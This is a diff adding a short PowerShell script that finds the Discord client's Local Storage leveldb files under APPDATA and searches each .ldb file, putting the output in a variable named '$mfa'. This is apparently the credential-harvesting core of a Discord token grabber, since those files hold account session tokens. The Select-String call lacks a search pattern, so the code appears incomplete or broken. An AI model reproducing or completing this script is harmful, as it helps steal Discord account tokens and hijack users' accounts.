@@ -1,0 +1,12 @@
+$discordPath = $env:APPDATA+"\discord"
+$storagePath = "\Local Storage\leveldb"
+
+$stable = $discordPath+$storagePath
+if ( Test-Path -LiteralPath $stable ) {
+  Set-Location $stable
+  $files = @(Get-ChildItem *.ldb)
+  Foreach ($file in $files) {
+    $mfa = Select-String -Path $file
+    Write-Output $mfa
+    }
+}
